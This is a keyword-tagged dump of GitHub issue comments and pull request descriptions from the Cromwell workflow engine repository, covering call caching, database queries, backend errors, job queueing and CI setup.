user data script to roll with whatever drives are available. Post in the forums. Nick reported this is a known problem and will be fixed upstream in SUSE eventually, but Amazon doesn’t control this AMI. **Random Docker CannotStartContainerErrors**. SUSE Linux consistently gets further in the workflow than Amazon Linux, but also consistently exhibits CannotStartContainerErrors deeper into the workflow. Action: Post in the forums. Although SUSE is more stable than Amazon Linux, there’s still not enough stability to run the workflow",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1542#issuecomment-292297531:134,optimiz,optimized,134,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1542#issuecomment-292297531,3,['optimiz'],['optimized']
Performance,"**Update: Non-additive retry counts**. If failures due to preemption can be clearly distinguished from failures due to other causes, I would prefer the failed_task_retries count to be independent of the preemptible count, rather than additive. For example, with failed_task_retries: 2 and preemptible: 2, I would expect the following behavior:; - try 1: preemptible machine, got preempted; - try 2: preemptible machine, other error (not preemption); - try 3: non-preemptible machine, error; - try 4: non-preemptible machine, error; - task fails. We have only retried 3 times here, because one of the non-preemption retries was ""used up"" when try 2 failed. (With additive behavior, we would have retried 4 times.). This behavior would allow users to independently set the retries due to preemption from those due to other causes, to more finely tune the desired behavior. However, if this can't be accommodated, this feature would still be very valuable with the additive behavior.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3161#issuecomment-358986427:844,tune,tune,844,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3161#issuecomment-358986427,2,['tune'],['tune']
Performance,"**Was the imports zip the same in each workflow?**; Yes, we were running the same workflow so the imports zip is the same. We get those import files by downloading them from github and adding them to a cache so that we don't have to download them for each workflow. **Were the workflows all the same?**; Yes, all of the workflows were the same . **Do you have any logs from the sender to check that a zip was indeed sent?**; No, we just have logs that a workflow was submitted to Cromwell 😞. **Were they submitted as a series of 999 separate submits or as a single batch submit POST?** ; They were submitted as a series of 999 individual requests in the ""On Hold"" status, and a separate process sent requests to Cromwell to started one of those on-hold workflows every 10 seconds.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4117#issuecomment-422854649:202,cache,cache,202,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4117#issuecomment-422854649,1,['cache'],['cache']
Performance,+; | TASK | ATTEMPT | ELAPSED | STATUS |; +----------------------------+---------+-----------------+-----------------------+; | batch_id_lines | 1 | 16.37s | Done |; | batch_sorted_tsv | 1 | 15.288s | Done |; | call_rate_lines | 1 | 5m34.525s | Done |; | computed_gender_lines | 1 | 5m34.523s | Done |; | csv2bam (Scatter) | - | 49.958s | 1/1 Done | 0 Failed |; | flatten_sample_id_lines | 1 | 5m29.56s | Done |; | get_max_nrecords (Scatter) | - | 5m32.076s | 1/1 Done | 0 Failed |; | green_idat_lines | 1 | 16.38s | Done |; | green_idat_tsv | 1 | 5m33.602s | Done |; | gtc | 1 | 10.602s | Done |; | gtc2vcf (Scatter) | - | 8m15.392s | 1/1 Done | 0 Failed |; | gtc_reheader | 1 | 4m16.907s | Done |; | gtc_tsv | 1 | 5m30.578s | Done |; | idat | 1 | 7.606s | Done |; | idat2gtc (Scatter) | - | 9m46.928s | 1/1 Done | 0 Failed |; | mocha_calls_tsv | 1 | 5m19.305941005s | Running |; | mocha_stats_tsv | 1 | 5m19.304938136s | Running |; | red_idat_lines | 1 | 16.386s | Done |; | red_idat_tsv | 1 | 5m33.603s | Done |; | ref_scatter | 1 | 17.728s | Done |; | sample_id_lines | 1 | 16.383s | Done |; | sample_id_split_tsv | 1 | 5m31.462s | Done |; | sample_sorted_tsv | 1 | 11.924s | Done |; | sample_tsv | 1 | 5m26.14s | Done |; | vcf_concat (Scatter) | - | 5m32.467s | 1/1 Done | 0 Failed |; | vcf_import (Scatter) | - | 8m16.609s | 1/1 Done | 0 Failed |; | vcf_merge (Scatter) | - | 2h6m53.926s | 23/23 Done | 0 Failed |; | vcf_mocha (Scatter) | - | 8m19.96s | 1/1 Done | 0 Failed |; | vcf_phase (Scatter) | - | 3h7m39.033s | 23/23 Done | 0 Failed |; | vcf_qc (Scatter) | - | 2h8m6.051s | 23/23 Done | 0 Failed |; | vcf_scatter (Scatter) | - | 5m25.444s | 1/1 Done | 0 Failed |; | vcf_split (Scatter) | - | 2h7m37.183s | 23/23 Done | 0 Failed |; | write_tsv | 1 | 5m10.124926865s | Running |; | xcl_vcf_concat | 1 | 5m28.883s | Done |; +----------------------------+---------+-----------------+-----------------------+; ```. > note: some tasks has duration of few seconds because I'm using call cache.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6677#issuecomment-1116554918:3498,cache,cache,3498,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6677#issuecomment-1116554918,1,['cache'],['cache']
Performance,", Jan 30, 2019 at 3:58 PM mcovarr <notifications@github.com> wrote:. > A handcrafted version of this query:; >; > select; > x2.`WORKFLOW_EXECUTION_UUID`,; > x2.`WORKFLOW_NAME`,; > x2.`WORKFLOW_STATUS`,; > x2.`START_TIMESTAMP`,; > x2.`END_TIMESTAMP`,; > x2.`SUBMISSION_TIMESTAMP`,; > x2.`WORKFLOW_METADATA_SUMMARY_ENTRY_ID`; > from; > WORKFLOW_METADATA_SUMMARY_ENTRY x2; > join; > (; > select; > WORKFLOW_EXECUTION_UUID; > from; > CUSTOM_LABEL_ENTRY; > where; > CUSTOM_LABEL_KEY = 'submissionIdKey'; > and CUSTOM_LABEL_VALUE = 'submissionIdValue'; > ) s; > on x2.WORKFLOW_EXECUTION_UUID = s.WORKFLOW_EXECUTION_UUID; > join; > (; > select; > WORKFLOW_EXECUTION_UUID; > from; > CUSTOM_LABEL_ENTRY; > where; > (; > CUSTOM_LABEL_KEY = 'caas-collection-name'; > and CUSTOM_LABEL_VALUE = 'me@gmail.com'; > ); > or (; > CUSTOM_LABEL_KEY = 'caas-collection-name'; > and CUSTOM_LABEL_VALUE = 'miguel-collection'; > ); > ) c; > on c.WORKFLOW_EXECUTION_UUID = x2.WORKFLOW_EXECUTION_UUID; >; > begets a much more performantEXPLAIN; >; > mysql> explain select x2.`WORKFLOW_EXECUTION_UUID`, x2.`WORKFLOW_NAME`, x2.`WORKFLOW_STATUS`, x2.`START_TIMESTAMP`, x2.`END_TIMESTAMP`, x2.`SUBMISSION_TIMESTAMP`, x2.`WORKFLOW_METADATA_SUMMARY_ENTRY_ID` from WORKFLOW_METADATA_SUMMARY_ENTRY x2 join (select WORKFLOW_EXECUTION_UUID from CUSTOM_LABEL_ENTRY where CUSTOM_LABEL_KEY = 'submissionIdKey' and CUSTOM_LABEL_VALUE = 'submissionIdValue') s on x2.WORKFLOW_EXECUTION_UUID = s.WORKFLOW_EXECUTION_UUID join (select WORKFLOW_EXECUTION_UUID from CUSTOM_LABEL_ENTRY where (CUSTOM_LABEL_KEY = 'caas-collection-name' and CUSTOM_LABEL_VALUE = 'me@gmail.com') or (CUSTOM_LABEL_KEY = 'caas-collection-name' and CUSTOM_LABEL_VALUE = 'miguel-collection')) c on c.WORKFLOW_EXECUTION_UUID = x2.WORKFLOW_EXECUTION_UUID;; > +----+-------------+--------------------+--------+---------------------------------------------+----------------------------------------+---------+---------------------------+------+---------------------------------",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4598#issuecomment-459176050:1779,perform,performantEXPLAIN,1779,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4598#issuecomment-459176050,1,['perform'],['performantEXPLAIN']
Performance,", m; ain.sex_mismatch_sample_list, main.load_shared_covars; [2022-12-15 21:28:03,68] [info] Assigned new job execution tokens to the following groups: 9e4f5894: 5; [2022-12-15 21:28:03,69] [info] BT-322 788d8048:main.low_genotyping_quality_sample_list:-1:1 is eligible for call caching with read = true and write = true; [2022-12-15 21:28:03,70] [info] BT-322 788d8048:main.sex_aneuploidy_sample_list:-1:1 is eligible for call caching with read = true and write = true; [2022-12-15 21:28:03,70] [info] BT-322 788d8048:main.sex_mismatch_sample_list:-1:1 is eligible for call caching with read = true and write = true; [2022-12-15 21:28:03,70] [info] BT-322 788d8048:main.load_shared_covars:-1:1 is eligible for call caching with read = true and write = true; [2022-12-15 21:28:03,70] [info] BT-322 788d8048:main.white_brits_sample_list:-1:1 is eligible for call caching with read = true and write = true; [2022-12-15 21:28:03,72] [info] BT-322 788d8048:main.load_shared_covars:-1:1 cache hit copying nomatch: could not find a suitable cache hit.; [2022-12-15 21:28:03,72] [info] 788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2-EngineJobExecutionActor-main.load_shared_covars:NA:1 [788d8048]: Could not copy a suitable cache hit for 788d8048:main.load_shared_covars:-1:1. No copy attempts were; made.; [2022-12-15 21:28:03,88] [warn] BackgroundConfigAsyncJobExecutionActor [788d8048main.load_shared_covars:NA:1]: Unrecognized runtime attribute keys: dx_timeout, memory; [2022-12-15 21:28:04,00] [warn] 788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2-BackendCacheHitCopyingActor-788d8048:main.sex_aneuploidy_sample_list:-1:1-20000000012 [788d8048main.sex_aneuploidy_sample_list:NA:1]: Unrecognized runtime attribute; keys: shortTask, dx_timeout; [2022-12-15 21:28:04,00] [info] BT-322 788d8048:main.sex_aneuploidy_sample_list:-1:1 cache hit copying success with aggregated hashes: initial = B2C071CED641A1EB183DE4A4655F45ED, file = DDF9190E939D36D999E513158D534532.; [2022-12-15 21:28:04,00] [info] 788d8048-ef2b-4d7c-b3cb-6e0",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6971:33931,cache,cache,33931,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6971,2,['cache'],['cache']
Performance,", use the content of this file as a hash. ## My takeaway. - I can't use a `softlink` cache duplication strategy as it's not allowed for containers. - If I select the `path+modtime` hashing strategy, only the first task in a workflow will succeed, as the hard-link duplication strategy will cause the path ""absolute"" be different (causing a hash differential). ## Questions. - ~What defines a cache hit, or exactly which information is used to the call hash?~; > I'll answer this one myself, by looking at the metadata returned from `/api/workflows/{version}/{id}/metadata`, within the `calls.$yourstepname.callCaching`, the hashes field has the following attributes:; > - `output count`; > - `runtime attribute`; > - `output expression`; > - `input count`; > - `backend name`; > - `command template`; > - `input`. - ~When does the command section get hashed (before or after replacements)?~; > The template gets cached. - ~What other elements go into the building the cache?~; > output count, runtime attribute, output expression, input count, backend name, command template, input. - What are the downsides with `check-sibling-md5`, can it be used in conjunction with `system.file-hash-cache`. - **Is the only way to use call-caching with containers without fully hashing the file?**. ## Possible resolutions. I was thinking the following might be potential solutions for my problem, but I don't know how good / bad they are, and they'd require changes to Cromwell. - Potential for a _cheaper_ (and potentially dirtier) hash for files? ; - When cromwell links from a cached result, store a map of { newpath : original } link to use or call caching, so when the hashDifferential is calculated, it uses the hash of the original cached result. (This would mean we could use the path+modtime strategy). ## Current attempt. I realised I may have run into another error here: https://github.com/broadinstitute/cromwell/issues/5348. This is my current configuration, it will successfully pull cache for the ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5346:3027,cache,cache,3027,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5346,1,['cache'],['cache']
Performance,"- 0.24; - SGE backend; - single workflow mode; - main workflow contains sub-workflow. The task ``ExtractReadInfo`` creates an output directory ``out/``. However, on my latest workflow run, I only see that some output directories for the workflow actually contain that directory. All jobs completed successfully, as far as I can tell. Note (in the below examples) how the ``out`` directory is not present in the call-cache hit. This makes getting output of tasks difficult to automate. I think this shard was a call caching miss:; ```; lichtens@gsa5 /dsde/working/lichtens/test_dl_oxoq/code/test_dl_oxoq/cromwell-executions/full_dl_ob_training/b449b259-4168-4002-b916-f85d152fea52/call-dl_ob_training$ ll shard-10/dl_ob_training/591dfd28-af3a-43ee-8429-d7053f90da93/call-ExtractReadInfo/execution/; total 1181; drwxrwsr-x 2 wga 14016 Jan 30 15:57 glob-20ebd8c9cf25515da3e6ce1213dba1ad/; -rw-rw-r-- 1 wga 7726 Jan 30 15:57 glob-20ebd8c9cf25515da3e6ce1213dba1ad.list; drwxrwsr-x 2 wga 14016 Jan 30 15:57 out/; -rw-rw-r-- 1 wga 2 Jan 30 15:57 rc; -rw-rw-r-- 1 wga 4819 Jan 30 15:56 script; -rw-rw-r-- 1 wga 1197 Jan 30 15:56 script.submit; -rw-r--r-- 1 wga 2740 Jan 30 15:57 stderr; -rw-rw-r-- 1 wga 0 Jan 30 15:56 stderr.submit; -rw-r--r-- 1 wga 274755 Jan 30 15:57 stdout; -rw-rw-r-- 1 wga 8 Jan 30 15:56 stdout.submit. ```. Whereas this one was a call cache hit:. ```; lichtens@gsa5 /dsde/working/lichtens/test_dl_oxoq/code/test_dl_oxoq/cromwell-executions/full_dl_ob_training/b449b259-4168-4002-b916-f85d152fea52/call-dl_ob_training$ ll shard-9/dl_ob_training/c5a2e7e2-3f45-4ea0-8558-84a1fa12120e/call-ExtractReadInfo/execution/; total 91; drwxrwsr-x 2 wga 8767 Jan 30 15:56 glob-20ebd8c9cf25515da3e6ce1213dba1ad/; lrwxrwxrwx 1 wga 244 Jan 30 15:56 rc -> /dsde/working/lichtens/test_dl_oxoq/code/test_dl_oxoq/cromwell-executions/full_dl_ob_training/2ce2eb73-4930-4b46-b93b-c30f3281e55c/call-dl_ob_training/shard-9/dl_ob_training/7150d86a-900f-4628-9b3d-476c483fcbd8/call-ExtractReadInfo/execution/rc; ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1935:416,cache,cache,416,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1935,1,['cache'],['cache']
Performance,"- 0.24; - SGE backend; - single workflow mode; - sub-workflows involved; - no docker. I can provide exact WDL, but replicating this may need new WDL. Feel free to ask me questions. I have a full WDL that calls two subworkflows, serially. . - The first takes a really long time and completed successfully on the first run. ; - The second subworkflow failed on the first run. This was due to an error in the call block of the WDL (marked below); - Fixed the error ; - Ran it again for a second run. Unexpected: In the second run, the first subworkflow call did not call cache and I do not know why not. Nothing was changed in the call block (nor parameters, etc etc). ```; import ""dl_ob_training.wdl"" as dl_ob_training; import ""m1/m1.wdl"" as m1. workflow full_dl_ob_training_with_m1 {. .....snip.....; Array[Pair[File, File]] tumor_bam_pair = zip(tumor_bam_files, tumor_bam_indices); scatter (p in tumor_normal_pairs) {. # All of the m1.m1 calls completed just fine; call m1.m1 {; input: ; tumorBam=p.left.left,; tumorBamIdx=p.left.right,; ....snip....; ; }. call dl_ob_training.dl_ob_training {; input:; # I fixed an error in the two lines below. Below is the corrected output; bam_file=p.left.left,; bam_file_index=p.left.right,; .....snip..........; }; }; }; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1970:568,cache,cache,568,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1970,1,['cache'],['cache']
Performance,"- Add load status logging where previously there was none for `PipelinesApiRequestManager.scala`; - Add high load logging to `IOActor`, which previously only had [back-to-normal logging](https://github.com/broadinstitute/cromwell/compare/develop...aen_wx_1333#diff-0be95c10972997df38906d44327436c1149e0c1a3df513bb49a43b9916ecd505R212); - Add load logging to `ServiceRegistryActor` which collects the load messages from their various sources and routes them to the sinks like `JobTokenDispenserActor`",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7253:6,load,load,6,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7253,4,['load'],['load']
Performance,- Additional wiring for the cromwell terminator.; - Reduced duplicate calls to ConfigFactory.load().; - Increased ability to pass around test configs.; - Provide names for more actors.; - Instrument failures in batch actors.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4785:93,load,load,93,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4785,1,['load'],['load']
Performance,- Creates a `CallCacheReadActor` to find cache hits in the database.; - Fixes a bug on cache hit checking that was referencing obsolete state data and missing legitimate cache hits.; - Makes data types that are logically sets actually `Set`s.; - Fix data type of `ALLOW_RESULT_REUSE` to match the 0.19 equivalent.; - Fix `CallCachingResultMetaInfoComponent` file naming to match the updated class name.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1289:41,cache,cache,41,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1289,3,['cache'],['cache']
Performance,"- Cromwell does not support soft links for dockerized jobs by [design](https://github.com/broadinstitute/cromwell/blob/29_hotfix/supportedBackends/sfs/src/main/scala/cromwell/backend/sfs/SharedFileSystem.scala#L112); - I guess that's because symlinks are a big challenge with Docker. They do not work inside Docker container unless both the directories are mounted (dir with symlink - Cromwell's tmp execution dir and original dir where input files are present), plus, mounts inside the container should have the same name/path as that of the host file system. Since Cromwell has information about original input files, they can be mounted along with the tmp execution dir (where symlinks will be created), to the Docker container; - This possesses a threat (of being modified inside a Docker container), to input files, which can be circumvented by using read only access to the input files (similar threat is also applicable to hard linked input files, in case of current behavior); - Also given the nature of hard-links, they can be completely eliminated . Benefits of using symlinks over hard-links:; - Hard links can't cross file systems; soft links can; - OS user which runs Cromwell requires to have a write access to input files in order for hard-links to work, this is not a requirement for soft links; - When hard-links do not work in case of Docker jobs (when necessary conditions - write access, same device requirement, aren't satisfied), Cromwell falls back to copy option, which takes a significant performance hit as the input files could be huge",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2620:1514,perform,performance,1514,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2620,1,['perform'],['performance']
Performance,"- Handle ""File"" output types for the JobStore; - Create a common `DatabaseSimpleton` trait for Job Store and call cache result code to share; - Centralize logic for conversion of `DatabaseSimpleton`s to `WdlValueSimpleton`s",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1350:114,cache,cache,114,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1350,1,['cache'],['cache']
Performance,"- JES backend; - cromwell server; - localhost mysql; - cromwell-27-c89c83f-SNAP.jar; - I set the database queue size to 3000.; - I have *not* changed the metadata batch size. *Should I attempt to restart this workflow?* This took over 4 hours to get this error message and I do not want to incur the cost if it will fail the same way again. Side issues:; - My workflow failed and yet cromwell is still *mauling* the mysql server.; - The call cache lookups are taking >1 hour per task. Main issue:. I do not understand the error messages, but my workflow has entered a Failed state and I am not sure why. First, I see a bunch of NPE:; ```; [ERROR] [05/01/2017 17:36:00.055] [cromwell-system-akka.dispatchers.engine-dispatcher-84] [akka.dispatch.Dispatcher] null; java.lang.NullPointerException; at cromwell.engine.workflow.lifecycle.execution.callcaching.CallCacheWriteActor.receiver(CallCacheWriteActor.scala:17); at cromwell.engine.workflow.lifecycle.execution.callcaching.CallCacheWriteActor$$anonfun$1.apply(CallCacheWriteActor.scala:21); at cromwell.engine.workflow.lifecycle.execution.callcaching.CallCacheWriteActor$$anonfun$1.apply(CallCacheWriteActor.scala:19); at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:32); at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91); at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72); at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:90); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJo",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2228:106,queue,queue,106,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2228,2,"['cache', 'queue']","['cache', 'queue']"
Performance,"- Like log4j was replaced also replace commons-logging with slf4j.; - Cromwell redirects java.util.logging calls to slf4j, only known to affect Liquibase as of now.; - Separate Liquibase workaround to print to logger instead of System.out.; - In Cromwell/Cromiam log the time Akka events are generated, not the time they arrive at slf4j.; - In Cromwell/Cromiam log the thread where Akka events are generated, not the thread performing the logging.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6813:424,perform,performing,424,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6813,1,['perform'],['performing']
Performance,- People should be able to change the backend name in the config without losing their call cache; - People should (probably?) be able to upgrade from PAPI1 to PAPI2 without losing their call cache,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3955:91,cache,cache,91,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3955,2,['cache'],['cache']
Performance,"- Refactored the DrsLocalizer to better handle multiple large downloads.; - Now, the DrsLocalizer will resolve all URLs up front, and then invoke the `getm` tool with a manifest containing all files to download. This improves download performance.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7214:235,perform,performance,235,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7214,1,['perform'],['performance']
Performance,"- Remove memory control which doesn't work anyway; - Make it so load control in general can be disabled by setting control-frequency to ""Inf""; - Log which components have reported with high load when the system freezes",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3540:64,load,load,64,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3540,2,['load'],['load']
Performance,"- Removes the awkward plateauing of running jobs at 2k, 4k, 6k, etc when running several thousand jobs concurrently.; - Does not introduce very long delays into execution store processing like the previous attempt to ""fix"" the execution store.; - Allows us to get a more accurate count of total jobs queued in the system because they will express themselves as EJEAs waiting for tokens rather than pre-queue-queued items of which we have no visibility.; - Adds a dummy backend to test all of the above. Review Notes:; * Start with the `Remove redundant WaitingForQueueSpace status` commit. That's the one which fixes the bug. Everything else is just dummy backend and test infrastructure.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6047:103,concurren,concurrently,103,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6047,3,"['concurren', 'queue']","['concurrently', 'queue-queued', 'queued']"
Performance,"- SGE backend; - 0.24; - single workflow; - call caching is on. Failure of intermediate task (CollectSequencingArtifactMetrics) on a single shard caused the entire workflow to stop immediately and cromwell to exit. Hence, successful tasks could not cache results, though those did complete. . The next tasks in the series (ExtractReadInfo) do not appear to ever be run, even for samples that did not fail CollectSequencingArtifactMetrics. ```; [ERROR] [01/23/2017 14:00:09.277] [cromwell-system-akka.dispatchers.engine-dispatcher-74] [akka://cromwell-system/user/SingleWorkflowRunnerActor/WorkflowManagerActor] WorkflowManagerActor Workflow 92c98fd6-003e-4f1b-b61b-9ab610f4961d failed (during ExecutingWorkflowState): Call dl_ob_training.dl_ob_training.CollectSequencingArtifactMetrics:NA:1: return code was 3; java.lang.RuntimeException: Call dl_ob_training.dl_ob_training.CollectSequencingArtifactMetrics:NA:1: return code was 3. ```. Command:; ```; java -Xmx6G -Dconfig.file=${PWD}/sge_application.conf -jar \; cromwell.jar \; run full_dl_ob_training.wdl \; full_dl_ob_training.json \; sge_runtimes \; full_dl_ob_training.metadata; ```. full_dl_ob_training.wdl:; ```; import ""dl_ob_training.wdl"" as dl_ob_training. workflow full_dl_ob_training {. ....snip.... scatter (p in variant_files_pair) {; call dl_ob_training.dl_ob_training {; input:; ....snip....; }; }; }. ```. dl_ob_training.wdl:; ```; workflow dl_ob_training {. ....snip.... call CollectSequencingArtifactMetrics {; input:; .....snip.....; }. call CreateObIntervalList {; input:; .....snip.....; }. call ExtractReadInfo {; input:; ....snip.....; }. output {; ExtractReadInfo.read_infos; }; }. task CollectSequencingArtifactMetrics {; ....snip....; output {; File pre_adapter_detail_metrics = ""${output_location_prepend}.pre_adapter_detail_metrics""; File pre_adapter_summary_metrics = ""${output_location_prepend}.pre_adapter_summary_metrics""; File bait_bias_detail_metrics = ""${output_location_prepend}.bait_bias_detail_metrics""; File ba",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1895:249,cache,cache,249,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1895,1,['cache'],['cache']
Performance,"- Send abort requests through the `JesAPIQueryManager`. This is wanted because currently each JABJEA aborts on its own which has undesired consequences, like flooding the backend thread pool with blocking requests.; - Lift the ""1 second"" maximum limit of the `JesPollingActor` by switching to milliseconds (new limit is 1 millisecond); - Add a second `JesPollingActor` to help with throughput of PAPI requests",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3357:382,throughput,throughput,382,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3357,1,['throughput'],['throughput']
Performance,- [ ] Requires concurrent merging of:; - https://github.com/openwdl/wdl/pull/275 (containing the grammar update); - https://github.com/openwdl/wdl/pull/162 (the spec text change),MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4450:15,concurren,concurrent,15,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4450,1,['concurren'],['concurrent']
Performance,"- [x] Add AWS creds to Vault. Done: `secret/dsde/cromwell/common/cromwell-aws`; - [x] Use AWS creds to setup an environment in AWS; - [x] Create a queue in AWS Batch; - [x] Create an S3 bucket for storing Cromwell outputs; - [ ] Gitignore the AWS credentials file; - [x] Create [src/ci/resources](https://github.com/broadinstitute/cromwell/tree/develop/src/ci/resources)/aws_application.conf.ctmpl; - [x] Reference the AWS creds from Vault; - [x] Add in the AWS Batch Queue name; - [x] Add the S3 bucket for storing Travis results; - [ ] Update [src/ci/bin/testCentaurAws.sh](https://github.com/broadinstitute/cromwell/blob/develop/src/ci/bin/testCentaurAws.sh) and run locally until it passes; - [ ] Insert `cromwell::build::setup_secure_resources` before `cromwell::build::assemble_jars`; - [ ] Exclude failed tests as necessary using `-e should_work_but_does_not_on_aws`; - [ ] If the AWS Batch queue was not hardcoded, export an environment variable with the queue name in `testCentaurAws.sh`; - [ ] Prepend `BUILD_TYPE=centaurAws` into the [.travis.yaml](https://github.com/broadinstitute/cromwell/blob/develop/.travis.yml) env matrix. See other centaur scripts and resources under [src/ci](https://github.com/broadinstitute/cromwell/blob/develop/src/ci) for examples.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3964:147,queue,queue,147,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3964,4,"['Queue', 'queue']","['Queue', 'queue']"
Performance,"- [x] Perform OAuth authentication (via clicky buttons in swagger, gcloud on CLI); - [x] Register user in Sam; - [x] Submit workflow to Cromwell; - [x] Get final results from Cromwell for that workflow",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2598#issuecomment-331165701:6,Perform,Perform,6,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2598#issuecomment-331165701,1,['Perform'],['Perform']
Performance,"- cromwell 26; - JES backend; - call caching on local mysql instance; - server mode. Ran a bunch of the initial jobs, but once it really started fan out (thousands of jobs), I got this error message. Trying to replicate now, but not sure if I can. Might be transient. . Regardless, error message is not particularly helpful. Any ideas? . ```; cromwell.core.CromwellFatalException: com.google.cloud.storage.StorageException: 410 Gone; {; ""error"": {; ""errors"": [; {; ""domain"": ""global"",; ""reason"": ""backendError"",; ""message"": ""Backend Error""; }; ],; ""code"": 503,; ""message"": ""Backend Error""; }; }. at cromwell.core.CromwellFatalException$.apply(core.scala:17); at cromwell.core.retry.Retry$$anonfun$withRetry$1.applyOrElse(Retry.scala:37); at cromwell.core.retry.Retry$$anonfun$withRetry$1.applyOrElse(Retry.scala:36); at scala.concurrent.Future$$anonfun$recoverWith$1.apply(Future.scala:346); at scala.concurrent.Future$$anonfun$recoverWith$1.apply(Future.scala:345); at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:32); at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91); at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72); at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:90); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at 